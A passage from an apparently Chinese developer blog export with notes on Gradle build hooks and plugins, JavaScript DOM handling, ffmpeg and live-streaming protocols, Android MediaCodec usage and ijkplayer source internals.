&#39;com.github.haldir65.starry:starry:1.0.0&#39; } 3. Building LifeCycle编译的各个阶段的hook正如gradle官网所介绍的，Build流程分为三个阶段(Initialization -&gt; Configuration -&gt; Execution) . The settings file is executed during the initialization phase. 即settings.gradle中的语句是最早被执行的 setting.gradle println ‘This is executed during the initialization phase.’ build.gradleprintln &#39;This is executed during the configuration phase.&#39; task configured { println &#39;This is also executed during the configuration phase.&#39; } task test { doLast { println &#39;This is executed during the execution phase.&#39; } } task testBoth { doFirst { println &#39;This is executed first during the execution phase.&#39; } doLast { println &#39;This is executed last during the execution phase.&#39; } println &#39;This is executed during the configuration phase as well.&#39; } 输出 gradle test testBothThis is executed during the initialization phase.This is executed during the configuration phase.This is also executed during the configuration phase.This is executed during the configuration phase as well.:testThis is executed during the execution phase.:testBothThis is executed first during the execution phase.This is executed last during the execution phase.BUILD SUCCESSFUL in 0s2 actionable tasks: 2 executed 经常会在build.gradle中看到这样一段 afterEvaluate { project -&gt; logger.info(&quot;=========afterEvaluate==============&quot;) project.tasks.each { task -&gt; if (task.name == &quot;test&quot;||task.name.contains(&quot;lint&quot;)){ task.enabled = false // 有些不必要的确实可以剔除掉 } // task.enabled = false 这么干的话全部任务都不会执行 println(&quot;-------------${task.name}----&quot;) } } closure就是一对花括号包着的东西afterEvaluate发生在Configuration之后，实际上也就是在project配置完成后，开始执行所有task前，对外提供一个closure，其实beforeEvaluate也有。 immediately invoked after a task is added to a project 在Task被添加到project的时候执行closure tasks.whenTaskAdded { task -&gt; task.ext.srcDir = &#39;src/main/java&#39; } task a println &quot;source dir is ${a.srcDir}&quot; project evaluate有可能成功，也会失败。但无论成功还是失败，下面的notification都会触发 gradle.afterProject {project, projectState -&gt; if (projectState.failure) { println &quot;Evaluation of $project FAILED&quot; } else { println &quot;Evaluation of $project succeeded&quot; } } 在gradle的plugin中实现也有类似的PluginImpl.groovy public class PluginImpl implements Plugin&lt;Project&gt; { void apply(Project project) { project.gradle.addProjectEvaluationListener() // 和在build.gradle中afterEvaluate差不多 project.getGradle().taskGraph.addTaskExecutionGraphListener() //在执行前 } } Task execution graph ready( graphPopulated,This method is called when the TaskExecutionGraph has been populated, and before any tasks are executed.)在任何task执行前被执行 Task execution(You can receive a notification immediately before and after any task is executed.)(TaskExecutionListener,在task执行前和执行后) project.gradle.addListener(new TaskExecutionListener() { @Override void beforeExecute(Task task) { } @Override void afterExecute(Task task, TaskState taskState) { } }) 而在build.gradle中是这样的写法 task ok task broken(dependsOn: ok) { group &#39;Welcome&#39; // 这个是task的一个属性 description &#39;Produces a greeting&#39; // 这个是在project中输入gradle tasks之后输出的任务列表中每一项后面的描述信息 doLast { throw new RuntimeException(&#39;broken&#39;) } } gradle.taskGraph.beforeTask { Task task -&gt; println &quot;executing $task ...&quot; } gradle.taskGraph.afterTask { Task task, TaskState state -&gt; if (state.failure) { println &quot;FAILED&quot; } else { println &quot;done&quot; } } 4. How to create gradle Plugin整体的过程和这里面说的差不多 add to your buidl script // 不可复用 创建BuildSrc文件夹 //依旧不可复用 创建一个Standalone Project //可复用 public class GreetingPlugin implements Plugin&lt;Project&gt; { @Override public void apply(Project project) { project.task(&quot;hello&quot;) .doLast(task -&gt; System.out.println(&quot;Hello Gradle!&quot;)); } } 使用Transform Api在class变成dex之前对class进行字节码修改本质上是在merge{ProductFlavor}{BuildType}Assets Task之后，transformClassesWithDexFor{ProductFlavor}{BuildType} Transform 之前,插入一个transformClassesWith{YourTransformName}For{ProductFlavor}{BuildType} Transform 5. update待查看 preBuild &lt;&lt; { String cmd = &quot;sh inrouter/maker/route.sh &quot; + project.getName() def cmdResult = cmd.execute().text.trim() println cmdResult } #echo &quot;Start make&quot; #javac -encoding utf-8 ./inrouter/maker/java/com/me/obo/maker/utils/*.java ./inrouter/maker/java/com/me/obo/maker/*.java -d inrouter/maker/class/ -cp inrouter/maker/libs/javapoet-1.9.0.jar #java -Djava.ext.dirs=inrouter/maker/libs -classpath inrouter/maker/class com.me.obo.maker.CodeMaker $1 $2 #echo &quot;End make&quot; Tinker的gradle plugin实现，非常有参考意义和java libraray提交到jcenter不同，gradle需要提交到Gradle Plugin Portal。没错，一个完全不一样的网站 明明已经把所有的包都改成implementation了，编译器还是报error ./gradlew :app:dependencies –configuration compile ##这条命令可以查询当前app中还有哪条依赖在用compile 在setting.gradle中这么写也是可以的 include ‘:library1’project(‘:library1’).projectDir = new File(‘../StickyListHeader/library1’) buildScript中gradle library的搜索顺序。比如自己添加了一个 maven { url &#39;https://maven.google.com/&#39; name &#39;Google&#39; } 像这样的repository 信不信由你，build.gradle文件有时候是从上往下读的。 buildTypes { release { minifyEnabled true proguardFiles getDefaultProguardFile(&#39;proguard-android.txt&#39;), &#39;proguard-rules.pro&#39; signingConfig signingConfigs.release shrinkResources true } debug { minifyEnabled false proguardFiles getDefaultProguardFile(&#39;proguard-android.txt&#39;), &#39;proguard-rules.pro&#39; } } // signingConfigs写在下面是不认的，把这个signingConfigs挪到上面就行了。这跟多数语言的函数声明要写在引用前头是一样的。 signingConfigs { release { // ... } } 如何debug gradle plugin在命令行里./gradlew clean assembleDebug -Dorg.gradle.daemon=false -Dorg.gradle.debug=true //一个是noDaemon 一个是debug=true (这段输入后命令行会卡在这里等debugger attach上来)然后照着在studio里面添加一个remote debug.然后点击这个debug按钮Listening for transport dt_socket at address: 5005 //这个是在等着To honour the JVM settings for this build a new JVM will be forked. Please consider using the daemon: https://docs.gradle.org/4.10.1/userguide/gradle_daemon.html. //这个是点了一次那个debug按钮Daemon will be stopped at the end of the build stopping after processing //这个是我又点了一次之后，终于开始运行了(要点两次。。。)效果是酱紫的 public class PluginImpl implements Plugin&lt;Project&gt; { void apply(Project project) { project.task(&#39;testTask&#39;).doLast{ println &quot;Hello gradle plugin&quot; } project.afterEvaluate { project.logger.error &quot;afterEvaluated&quot; //这个先执行 if (project.plugins.hasPlugin(&quot;com.android.application&quot;)) { def android = project.extensions.getByName(&quot;android&quot;) android.applicationVariants.all {ApplicationVariantImpl variant -&gt; //这里会冒出来debug和release的两种variant，似乎android gradle plugin 在3.5的时候会设定lazyTask,就是这里只会有一个debug project.logger.error &quot;DebuggerPlugin:${variant}&quot; ApplicationVariantData apkVariantData = variant.getProperty(&#39;variantData&#39;) ApplicationVariantData variantData = variant.getVariantData() TestVariant testVariant = variant.getTestVariant() UnitTestVariant unitTestVariant = variant.getUnitTestVariant() } } } } } errorOne of the classes is an explicit generated class using the class statement, the other is a class generated from the script body based on the file name. Solutions are to change the file name or to change the class name. 出现错误的原因是在class外面还写了语句 比较复杂的gradle knowledgeofficial gradle docs 是最好的学习资料custom_pluginsBuild Script Basics关于Android Gradle你需要知道这些（4）Gradle插件学习笔记（四)Android Gradle Plugin source Codegradle api挪到google()仓库了","tags":[]},{"title":"DOM操作手册","date":"2018-02-02T23:30:25.000Z","path":"2018/02/02/2018-02-02-html-dom-manipulation/","text":"HTML Document操作手册 使用javaScript操作dom的记录 拦截form的submithow-to-prevent-form-from-being-submitted &lt;form onsubmit=&quot;return mySubmitFunction()&quot;&gt; &lt;label for=&quot;this is the text before the value&quot;type=&#39;text&#39;&gt;&lt;/label&gt; &lt;label type=&#39;text&#39;&gt;&lt;/label&gt; &lt;/form&gt; 在mySubmitFunction()中return false并不能阻止表单被提交。正确的做法 const element = document.querySelector(&#39;form&#39;); element.addEventListener(&#39;submit&#39;, event =&gt; { event.preventDefault(); // actual logic, e.g. validate the form console.log(&#39;Form submission cancelled.&#39;); }); a标签的事件绑定&lt;a href=&quot;javascript:;&quot;&gt;&lt;/a&gt; &lt;a href=&quot;javascript:void(0)&quot;&gt;&lt;/a&gt; input file选出来的图片路径c-fakepath.浏览器并不会将底层的文件实际路径暴露给开发者，这是出于安全考虑。所以使用 document.querySelectorAll(&#39;input&#39;)[3].value &quot;C:\\fakepath\\image_7.jpg&quot; //所以一般要用string.split(&#39;\\\\&#39;)处理一下 被document.getElementById坑了一个html页面只能有一个id的规则都知道，可是偏偏一个页面写了两个id一样的tag，网页照样跑，console没有任何报错。但是使用document.getElementById的时候，拿到的就是第一个。浏览器还真是能容错啊。顺便记录下vanilla js和jQuery detect 一个file input的方法 const input2 = document.getElementById(&#39;file_2&#39;); input2.addEventListener(&#39;change&#39;, () =&gt; { showPreview2(this.id,&#39;portrait2&#39;); }) $(&#39;#file_2&#39;).on(&#39;change&#39;, () =&gt; { showPreview2(&#39;file_2&#39;,&#39;portrait2&#39;); }) $(&#39;#file_2&#39;).change( () =&gt; { showPreview2(this.id,&#39;portrait2&#39;); }) 为毛浏览器内嵌视频要用iframe因为video source是host在其他的sites的啊，因为跨域的问题，不得不使用iframe。因为就算用iframe，里面其实还是一个video的tg。 html js是不能写文件的node js提供了fs api来进行文件读写，浏览器中js不能读写本地文件。(html5提供了localStorage api，但最大容量好像是5MB，通过浏览器读文件也必须用户手动触发选择) 头一次听说noscript这种东西&lt;html&gt; &lt;body&gt; &lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; &lt;!-- document.write(&quot;Hello World!&quot;) //--&gt; &lt;/script&gt; &lt;noscript&gt; Sorry...JavaScript is needed to go ahead. &lt;/noscript&gt; &lt;/body&gt; &lt;/html&gt; 如果浏览器不支持javascript的话，noScript中的内容就会显示出来 document对象的所有方法在mdn上都有js操作cookie的方式随便开一个网页，在console中输入document.cookie就可以看到设置的cookie或者在chrome的resource tab中也能看到js能够操作cookie的前提是cookie中没有HttpOnly=true 字段 document.cookie = &quot;key1=value1;key2=value2;expires=date&quot;; 浏览器信息一般在Navigator对象里面拿var browsername=navigator.appName; if( browsername == &quot;Netscape&quot; ) { window.location=&quot;http://www.location.com/ns.htm&quot;; } else if ( browsername ==&quot;Microsoft Internet Explorer&quot;) { window.location=&quot;http://www.location.com/ie.htm&quot;; } else { window.location=&quot;http://www.location.com/other.htm&quot;; } navigator里面常用的还有platform,userAgent等随便在chrome里面试了下navigator.appName ==&gt; Netscapenavigator.platform ==&gt; win32 在浏览器里操作cookie可以用原生api自己去操作string，但推荐使用成熟的库 文件上传一般使用file tag就可以了这种是单文件的 &lt;form action=&quot;&quot; method=post enctype=multipart/form-data&gt; &lt;input type=file name=file&gt; &lt;input type=submit value=Upload&gt; &lt;/form&gt; &lt;form action=&quot;/upload&quot; method=&quot;post&quot;&gt; 选择图片：&lt;input type=&quot;file&quot; name=&quot;img&quot; multiple=&quot;multiple&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt; &lt;/form&gt; &lt;p&gt;请尝试在浏览文件时选取一个以上的文件。&lt;/p&gt; html中有data标签文档 &lt;article id=&quot;electriccars&quot; data-columns=&quot;3&quot; data-index-number=&quot;12314&quot; data-parent=&quot;cars&quot;&gt; ... &lt;/article&gt; js里面可以这样去获取对应的值 var article = document.getElementById(&#39;electriccars&#39;); article.dataset.columns // &quot;3&quot; article.dataset.indexNumber // &quot;12314&quot; 注意dash被替换成了CamelCase article.dataset.parent // &quot;cars&quot;","tags":[{"name":"前端","slug":"前端","permalink":"https://haldir65.github.io/tags/前端/"}]},{"title":"ffmpeg知识手册","date":"2018-01-24T13:44:33.000Z","path":"2018/01/24/2018-01-24-ffmpeg-basics-and-rtmp-related/","text":"ffmpeg安装手记 安装how-to-install-ffmpeg-on-windows下载 检查下是否安装完成: ffmpeg -codecs Basic commands ffmpeg -i video.mp4 ## 从视频中提取出信息 ffmpeg -i video.mp4 video.avi ## 格式转换ffmpeg -i input.mp4 -vn -ab 320 output.mp3 ##提取视频中的音频，转成mp3ffmpeg -i input.mp4 -t 50 output.avi ## 提取视频前50sffmpeg -i input.mp4 -aspect 16:9 output.mp4 ## 更改长宽比 参考20-ffmpeg-commands-beginners 需要知道的是，视频转码是很费性能的，消耗的时间也比较长。 视频基础信息视频包括：内容元素ImageAudioMetadata(元信息) 编码解码器(Codec)video: H.263, H.264,H.265Audio: AAC, HE-AAC 容器文件格式(Container)MP3 , Mp4 ,FLV, AVI 视频关键字帧率（Frame rate）码率 （Bit rate） – 这个是指文件大小分辨率 (Bit rate)图片群组 (Group of Picture， GOP) I帧率 ： 关键帧(完整，直接解码) B/P帧 ：参考帧 P帧依赖于前帧，B帧依赖于前后帧 帧数据 编码压缩之后组成多个GOP，最后封装成视频。 视频直播结构 摄像头 编码 -&gt; 视频流 -&gt; 传输给server -&gt; server负责推流 -&gt; 交给播放器录制包括Native, webRTC(提供js的api获取视频数据)直播协议这边，分为HLS和rtmp. html5的video标签使用HLS协议(.m3u8)，pc端使用flash,native端使用系统播放器使用rtmp协议 HLSHLS(HTTP Live Streaming)协议播放视频流在webview中使用比较简单,android和ios的webview都支持 &lt;video control autoplay&gt; &lt;source src=&quot;http://10.66.99.77:8080/hls/mystream.m38u&quot; type=&quot;application/vnd.apple.mpegurl&quot;/&gt; &lt;p class=&quot;warning&quot;&gt;Your browser does not support HTML5 video. &lt;/p&gt; &lt;/video&gt; HLS协议的.m3u8文件理论上就是讲推送的视频流切分成多个.ts文件外加一些配置。注意这个.m3u8文件只是一个文本文件，很小的。所以video标签在请求完上面的m3u8文件之后，就会根据配置信息去拉取真正的.ts文件。ts文件时长太长或者太短都不好，一般推荐是5s。 RTMP(Real Time Messaging Protocol)是Macromedia开发的直播协议，现在属于Adobe。rtmp和HLS一样可以用于视频直播，但是RTMP因为是基于flash的，所以无法在ios生态中播放，但是实时性要比HLS好，就是低延时。所以一般使用这种协议来上传视频流，也就是视频流推送到服务器。RTMP是基于tcp长连接的，延时在2s左右，而HLS是基于http的，延时在10-30s左右。推流端的话，Android一般是用MediaCodec将视频数据编码成rtmp包的格式，RTMP流本质上是FLV格式的音视频nginx上要配合一个nginx-rtmp-module来做 移动端音视频方案选择一般来说，音视频，摄像头这一块相关的api。Google在这方面的控制力都非常弱，导致各大厂商之间的实现存在各种差异。吐槽MediaCodec的文章很多现实中，在Android平台上音视频编码器的选择包括：用NediaCodec或者FFMpeg+x264/openh264。MediaRecorder能录，但是不能一帧帧地去处理。有人比较了mediaRecoder、ffmpeg和mediaCodec的差别简单来讲,MediaCodec有硬件加成，速度快，更加接近底层(但是强烈依赖OEM的实现，不同机型表现不同，bug有不少)ffmpeg慢一点，但是几乎什么都能干，不同机型上表现一致。但是so文件很大。 MediaCodec 这个类的使用（ MediaCodec, MediaMuxer, and MediaExtractor）MediaMuxer是用来把video track和audio track合并起来的MediaCodec的api pageMediaCodec可以处理的数据有以下三种类型：压缩数据、原始音频数据、原始视频数据。这三种类型的数据均可以利用ByteBuffers进行处理，但是对于原始视频数据应提供一个Surface以提高编解码器的性能。Surface直接使用native视频数据缓存，而没有映射或复制它们到ByteBuffers，因此，这种方式会更加高效。MediaCodec采用异步方式处理数据，并且使用了一组输入输出缓存（ByteBuffer）。通过请求一个空的输入缓存（ByteBuffer），向其中填充满数据并将它传递给编解码器处理。编解码器处理完这些数据并将处理结果输出至一个空的输出缓存（ByteBuffer）中。使用完输出缓存的数据之后，将其释放回编解码器：在使用一个Surface的时候，可以使用ImageReader获取视频某一帧的raw date，也可以使用Image这个class的getInputImage()方法 Use MediaCodecList to create a MediaCodec for a specific MediaFormat. When decoding a file or a stream, you can get the desired format from MediaExtractor.getTrackFormat. Inject any specific features that you want to add using MediaFormat.setFeatureEnabled, then call MediaCodecList.findDecoderForFormat to get the name of a codec that can handle that specific media format. Finally, create the codec using createByCodecName(String). 就是说MediaCode的创建需要走factory method那一套，首先根据dataSource，使用MediaExtractor去提取音视频track，然后使用MediaCodecList.findDecoderForFormat找到一个可以用的codec的名称。最后，使用createByCodecName去创建出一个MediaCodec. 创建完MediaCodec之后就要去初始化它了，可以使用setCallback去进行异步解码。这个callback长这样。 public static abstract class Callback { /** * Called when an input buffer becomes available. * * @param codec The MediaCodec object. * @param index The index of the available input buffer. */ public abstract void onInputBufferAvailable(@NonNull MediaCodec codec, int index); /** * Called when an output buffer becomes available. * * @param codec The MediaCodec object. * @param index The index of the available output buffer. * @param info Info regarding the available output buffer {@link MediaCodec.BufferInfo}. */ public abstract void onOutputBufferAvailable( @NonNull MediaCodec codec, int index, @NonNull BufferInfo info); /** * Called when the MediaCodec encountered an error * * @param codec The MediaCodec object. * @param e The {@link MediaCodec.CodecException} object describing the error. */ public abstract void onError(@NonNull MediaCodec codec, @NonNull CodecException e); /** * Called when the output format has changed * * @param codec The MediaCodec object. * @param format The new output format. */ public abstract void onOutputFormatChanged( @NonNull MediaCodec codec, @NonNull MediaFormat format); } 接下来使用方法设置这个codec去使用特定格式的数据格式，并且在这个时候提供一个surface，视频播放就是这里设置的 public void configure (MediaFormat format, Surface surface, MediaCrypto crypto, int flags) 调用MediaCodec处理数据的方式:每一个Codec都包含一组input和output buffers，外部可以使用bufferId（int）来对其进行操控。在同步模式下，可以使用dequeueInputBuffer(long)和dequeueOutputBuffer()分别从code获取一块输入或者输出buffer。在异步模式下，在MediaCodec.Callback.OnInputBufferAvailable/和MediaCodec.Callback.onOutputBufferAvailable中可以获得buffer。 buffer拿到手之后，自己往里面塞数据(ByteBuffer和jdk里的buffer是一样的，一个需要注意的方法是order(ByteOrder.BIG_ENDIAN)，就是字节数组的字节序问题，一般都是用natural order，这个order方法用的很多) 虽然java是大端的，但是Android在native层都是Little endian的，这话在Bits.java中写了. // -- Processor and memory-system properties -- // Android-changed: Android is always little-endian. // private static final ByteOrder byteOrder; private static final ByteOrder byteOrder = ByteOrder.LITTLE_ENDIAN; 上面说到往buffer塞满数据后，就能调用MediaCodec.queueInputBuffer方法把数据丢给codec，codec相应的会在onOutputBufferAvailable回调或者在dequeueOutputBuffer方法中返回一份只读的buffer。用完之后这部分之后，调用releaseOutputBuffer将这份buffer还给codec。（用完了就要还，不然codec会阻塞住） MediaCodec一般是这么用的，文档上也建议使用异步的方法 MediaCodec codec = MediaCodec.createByCodecName(name); MediaFormat mOutputFormat; // member variable codec.setCallback(new MediaCodec.Callback() { @Override void onInputBufferAvailable(MediaCodec mc, int inputBufferId) { ByteBuffer inputBuffer = codec.getInputBuffer(inputBufferId); // fill inputBuffer with valid data … codec.queueInputBuffer(inputBufferId, …); } @Override void onOutputBufferAvailable(MediaCodec mc, int outputBufferId, …) { ByteBuffer outputBuffer = codec.getOutputBuffer(outputBufferId); MediaFormat bufferFormat = codec.getOutputFormat(outputBufferId); // option A // bufferFormat is equivalent to mOutputFormat // outputBuffer is ready to be processed or rendered. … codec.releaseOutputBuffer(outputBufferId, …); } @Override void onOutputFormatChanged(MediaCodec mc, MediaFormat format) { // Subsequent data will conform to new format. // Can ignore if using getOutputFormat(outputBufferId) mOutputFormat = format; // option B } @Override void onError(…) { … } }); codec.configure(format, …); mOutputFormat = codec.getOutputFormat(); // option B codec.start(); // wait for processing to complete codec.stop(); codec.release(); 但同时也给出了一份同步的版本 MediaCodec codec = MediaCodec.createByCodecName(name); codec.configure(format, …); MediaFormat outputFormat = codec.getOutputFormat(); // option B codec.start(); for (;;) { int inputBufferId = codec.dequeueInputBuffer(timeoutUs); if (inputBufferId &gt;= 0) { ByteBuffer inputBuffer = codec.getInputBuffer(…); // fill inputBuffer with valid data … codec.queueInputBuffer(inputBufferId, …); } int outputBufferId = codec.dequeueOutputBuffer(…); if (outputBufferId &gt;= 0) { ByteBuffer outputBuffer = codec.getOutputBuffer(outputBufferId); MediaFormat bufferFormat = codec.getOutputFormat(outputBufferId); // option A // bufferFormat is identical to outputFormat // outputBuffer is ready to be processed or rendered. … codec.releaseOutputBuffer(outputBufferId, …); } else if (outputBufferId == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) { // Subsequent data will conform to new format. // Can ignore if using getOutputFormat(outputBufferId) outputFormat = codec.getOutputFormat(); // option B } } codec.stop(); codec.release(); 如果使用output Surface的话（就是播放器嘛）此时可以选择是否将Buffer渲染到surface上，你有三个选择： Do not render the buffer: Call releaseOutputBuffer(bufferId, false). Render the buffer with the default timestamp: Call releaseOutputBuffer(bufferId, true). Render the buffer with a specific timestamp: Call releaseOutputBuffer(bufferId, timestamp). Adaptive Playback 这里也提到了视频流中关键帧的概念 It is important that the input data after start() or flush() starts at a suitable stream boundary: the first frame must a key frame. A key frame can be decoded completely on its own (for most codecs this means an I-frame), and no frames that are to be displayed after a key frame refer to frames before the key frame. 找到了一个解释如何使用MediaExtractor从mp4文件中提取分离音频和视频的代码 private void exactorMedia() { FileOutputStream videoOutputStream = null; FileOutputStream audioOutputStream = null; try { //分离的视频文件 File videoFile = new File(SDCARD_PATH, &quot;output_video.mp4&quot;); //分离的音频文件 File audioFile = new File(SDCARD_PATH, &quot;output_audio&quot;); videoOutputStream = new FileOutputStream(videoFile); audioOutputStream = new FileOutputStream(audioFile); //源文件 mediaExtractor.setDataSource(SDCARD_PATH + &quot;/input.mp4&quot;); //信道总数 int trackCount = mediaExtractor.getTrackCount(); int audioTrackIndex = -1; int videoTrackIndex = -1; for (int i = 0; i &lt; trackCount; i++) { MediaFormat trackFormat = mediaExtractor.getTrackFormat(i); String mineType = trackFormat.getString(MediaFormat.KEY_MIME); //视频信道 if (mineType.startsWith(&quot;video/&quot;)) { videoTrackIndex = i; } //音频信道 if (mineType.startsWith(&quot;audio/&quot;)) { audioTrackIndex = i; } } ByteBuffer byteBuffer = ByteBuffer.allocate(500 * 1024); //切换到视频信道 mediaExtractor.selectTrack(videoTrackIndex); while (true) { int readSampleCount = mediaExtractor.readSampleData(byteBuffer, 0); if (readSampleCount &lt; 0) { break; } //保存视频信道信息 byte[] buffer = new byte[readSampleCount]; byteBuffer.get(buffer); videoOutputStream.write(buffer); byteBuffer.clear(); mediaExtractor.advance(); } //切换到音频信道 mediaExtractor.selectTrack(audioTrackIndex); while (true) { int readSampleCount = mediaExtractor.readSampleData(byteBuffer, 0); if (readSampleCount &lt; 0) { break; } //保存音频信息 byte[] buffer = new byte[readSampleCount]; byteBuffer.get(buffer); audioOutputStream.write(buffer); byteBuffer.clear(); mediaExtractor.advance(); } } catch (IOException e) { e.printStackTrace(); } finally { mediaExtractor.release(); try { videoOutputStream.close(); } catch (IOException e) { e.printStackTrace(); } } } Android 视频分离和合成(MediaMuxer和MediaExtractor)关于MediaCodec这个类的使用 这里贴一个NV21和Yuv420之间的转换 public class Yuv420Util { /** * Nv21: * YYYYYYYY * YYYYYYYY * YYYYYYYY * YYYYYYYY * VUVU * VUVU * VUVU * VUVU * &lt;p&gt; * I420: * YYYYYYYY * YYYYYYYY * YYYYYYYY * YYYYYYYY * UUUU * UUUU * VVVV * VVVV * * @param data * @param dstData * @param w * @param h */ public static void Nv21ToI420(byte[] data, byte[] dstData, int w, int h) { int size = w * h; // Y System.arraycopy(data, 0, dstData, 0, size);//Y都是一样的 for (int i = 0; i &lt; size / 4; i++) { dstData[size + i] = data[size + i * 2 + 1]; //U dstData[size + size / 4 + i] = data[size + i * 2]; //V } } // Nv21 to Yuv Semi Planar public static void Nv21ToYuv420SP(byte[] data, byte[] dstData, int w, int h) { int size = w * h; // Y都是一样的 System.arraycopy(data, 0, dstData, 0, size); for (int i = 0; i &lt; size / 4; i++) { dstData[size + i * 2] = data[size + i * 2 + 1]; //U dstData[size + i * 2 + 1] = data[size + i * 2]; //V } } } c语言的实现YUVtoRBGA和YUVtoARBG Exoplayer查看exoplayer的源码，dataSource在拉到数据之后，最终交给MediaCodecRender，后者调用processOutputBuffer，核心代码是这句: codec.releaseOutputBuffer(bufferIndex, releaseTimeNs);//codec是MediaCodec实例 // If you are done with a buffer, use this call to update its surface timestamp and return it to the codec to render it on the output surface. 说的很清楚了，就是把这块buffer还给codec从而在surface上渲染 public final void releaseOutputBuffer(int index, long renderTimestampNs) { //... } ijkplayer的原理ijkplayer可以选择mediaPlayer，exoplayer或者是IjkMediaPlayer。exoplayer是基于MediaCodec的，而IjkMediaPlayer是一个基于FFPlay的轻量级Android/iOS视频播放器，实现了跨平台的功能，API易于集成；编译配置可裁剪，方便控制安装包大小。 整体的代码结构是：tool - 初始化的一些脚本config - 编译ffmpeg的一些配置文件extra 用于存放编译ijkplayer所需要的依赖源文件，比如ffmpeg，openssl等ijkmedia 核心代码 — ijkplayer 播放器数据下载及解码相关 — ijksdl 音视频数据渲染相关（理由有一个gles2文件夹，里头装了opengl渲染yuv格式的代码）ios ios平台上的上层接口封装andriod 一些jni函数 Android相关的代码在android/ijkplayer/ijkplayer-java/src/main/java/tv/danmaku/ijk/media/player/IjkMediaPlayer.java这里，比方说这个start方法，java层start最终调用到 private native void _start() throws IllegalStateException; 映射到jni这边是ijkplayer/ijkmedia/ijkplayer/android/ijkplayer_jni.c这个文件 static int ijkmp_start_l(IjkMediaPlayer *mp) { assert(mp); MP_RET_IF_FAILED(ikjmp_chkst_start_l(mp-&gt;mp_state)); ffp_remove_msg(mp-&gt;ffplayer, FFP_REQ_START); ffp_remove_msg(mp-&gt;ffplayer, FFP_REQ_PAUSE); ffp_notify_msg1(mp-&gt;ffplayer, FFP_REQ_START); return 0; } int ijkmp_start(IjkMediaPlayer *mp) { assert(mp); MPTRACE(&quot;ijkmp_start()\\n&quot;); pthread_mutex_lock(&amp;mp-&gt;mutex); int retval = ijkmp_start_l(mp); pthread_mutex_unlock(&amp;mp-&gt;mutex); MPTRACE(&quot;ijkmp_start()=%d\\n&quot;, retval); return retval; } c语言这边，首先是创建player IjkMediaPlayer *ijkmp_android_create(int(*msg_loop)(void*)) { IjkMediaPlayer *mp = ijkmp_create(msg_loop); if (!mp) goto fail; mp-&gt;ffplayer-&gt;vout = SDL_VoutAndroid_CreateForAndroidSurface(); if (!mp-&gt;ffplayer-&gt;vout) goto fail; mp-&gt;ffplayer-&gt;pipeline = ffpipeline_create_from_android(mp-&gt;ffplayer); if (!mp-&gt;ffplayer-&gt;pipeline) goto fail; ffpipeline_set_vout(mp-&gt;ffplayer-&gt;pipeline, mp-&gt;ffplayer-&gt;vout); return mp; fail: ijkmp_dec_ref_p(&amp;mp); return NULL; } 主要干了三件事，创建了IjkMediaPlayer对象，为这个对象的FFPlayer指定vout(图像渲染对象)和pipeline(音视频解码相关) IMediaPlayer.prepareAsync方法 -&gt; IjkMediaPlayer_prepareAsync -&gt;… -&gt; 最终调用到ijkplayer.c中的 int ffp_prepare_async_l(FFPlayer *ffp, const char *file_name) 随后调用这个方法 static VideoState *stream_open(FFPlayer *ffp, const char *filename, AVInputFormat *iformat){ /* start video display */ if (frame_queue_init(&amp;is-&gt;pictq, &amp;is-&gt;videoq, ffp-&gt;pictq_size, 1) &lt; 0) goto fail; if (frame_queue_init(&amp;is-&gt;subpq, &amp;is-&gt;subtitleq, SUBPICTURE_QUEUE_SIZE, 0) &lt; 0) goto fail; if (frame_queue_init(&amp;is-&gt;sampq, &amp;is-&gt;audioq, SAMPLE_QUEUE_SIZE, 1) &lt; 0) goto fail; //创建视频渲染线程 is-&gt;video_refresh_tid = SDL_CreateThreadEx(&amp;is-&gt;_video_refresh_tid, video_refresh_thread, ffp, &quot;ff_vout&quot;); //创建读取数据线程 ff_read is-&gt;read_tid = SDL_CreateThreadEx(&amp;is-&gt;_read_tid, read_thread, ffp, &quot;ff_read&quot;); } 注意视频解码和音频是两条并行的线，播放器做好了同步控制。（subtitle也算一条线） ff_ffplay.c /* this thread gets the stream from the disk or the network */ static int read_thread(void *arg){ do { //.. err = avformat_find_stream_info(ic, opts); //这个avformat_find_stream_info是ffmpeg的api } while(0); ffp_notify_msg1(ffp, FFP_MSG_FIND_STREAM_INFO); for (i = 0; i &lt; ic-&gt;nb_streams; i++) { //...选择想要的track // choose first h264 if (type == AVMEDIA_TYPE_VIDEO) { if (codec_id == AV_CODEC_ID_H264) { //.. } } } //然后是打开流 /* open the streams */ if (st_index[AVMEDIA_TYPE_AUDIO] &gt;= 0) { stream_component_open(ffp, st_index[AVMEDIA_TYPE_AUDIO]); } else { ffp-&gt;av_sync_type = AV_SYNC_VIDEO_MASTER; is-&gt;av_sync_type = ffp-&gt;av_sync_type; } //打开媒体数据，得到的是音视频分离的解码前数据 ret = av_read_frame(ic, pkt); for (;;) { //注意这里写了一个循环，所以下面的过程是持续的 if (is-&gt;abort_request) break; } //每次读取一部分数据就调用ffmpeg api往后挪一点 ret = avformat_seek_file(is-&gt;ic, -1, seek_min, seek_target, seek_max, is-&gt;seek_flags); if (is-&gt;audio_stream &gt;= 0) { //把音频放进队列 packet_queue_flush(&amp;is-&gt;audioq); packet_queue_put(&amp;is-&gt;audioq, &amp;flush_pkt); // TODO: clear invaild audio data // SDL_AoutFlushAudio(ffp-&gt;aout); } if (is-&gt;subtitle_stream &gt;= 0) { //把字幕放进队列 packet_queue_flush(&amp;is-&gt;subtitleq); packet_queue_put(&amp;is-&gt;subtitleq, &amp;flush_pkt); } if (is-&gt;video_stream &gt;= 0) { //把视频数据放进队列 if (ffp-&gt;node_vdec) { ffpipenode_flush(ffp-&gt;node_vdec); } packet_queue_flush(&amp;is-&gt;videoq); packet_queue_put(&amp;is-&gt;videoq, &amp;flush_pkt); } } stream_component_open中根据数据的类型，分别创建音频解码器，视频解码器或是字幕解码器 static int stream_component_open(FFPlayer *ffp, int stream_index){ ... switch (avctx-&gt;codec_type) { case AVMEDIA_TYPE_AUDIO : is-&gt;last_audio_stream = stream_index; forced_codec_name = ffp-&gt;audio_codec_name; break; case AVMEDIA_TYPE_SUBTITLE: is-&gt;last_subtitle_stream = stream_index; forced_codec_name = ffp-&gt;subtitle_codec_name; break; case AVMEDIA_TYPE_VIDEO : is-&gt;last_video_stream = stream_index; forced_codec_name = ffp-&gt;video_codec_name; break; default: break; } ... } static IJKFF_Pipenode *func_open_video_decoder(IJKFF_Pipeline *pipeline, FFPlayer *ffp) { IJKFF_Pipeline_Opaque *opaque = pipeline-&gt;opaque; IJKFF_Pipenode *node = NULL; if (ffp-&gt;mediacodec_all_videos || ffp-&gt;mediacodec_avc || 